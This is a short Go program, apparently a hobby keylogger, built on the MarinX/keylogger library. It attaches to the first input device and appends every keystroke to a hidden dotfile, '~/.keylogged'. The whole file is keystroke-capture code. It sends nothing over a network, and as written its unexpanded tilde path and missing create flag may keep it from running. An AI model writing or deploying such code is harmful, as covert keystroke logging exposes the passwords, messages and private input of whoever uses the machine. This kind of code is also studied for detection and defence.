package main
import(
	"fmt"
	"log"
	"os"
	"github.com/MarinX/keylogger"
)

func main(){
//	Let's prepare the file
	f, err := os.OpenFile("~/.keylogged", os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
    		panic(err)
	}
	defer f.Close()

	//I've got devices!
	ndevices, err := keylogger.NewDevices()
	if err != nil {
		log.Fatal("Error:",err)
		return
	}
	for _, eachDev := range ndevices {
		fmt.Println("Id->", eachDev.Id,"Name:", eachDev.Name)
	}
	//Index value to be set to keyboard, mind it!
	rd := keylogger.NewKeyLogger(ndevices[0])
	in, err := rd.Read()
	if err!= nil {
		log.Fatal("Error:", err)
		return
	}

	for i := range in {
	//listen only key stroke event

  	if i.Type == keylogger.EV_KEY {
	//Get the key value
    	b := i.KeyString()
	//Write it to the file
	if _, err = f.WriteString(b); err != nil {
    	panic(err)
	}
	}

}

}
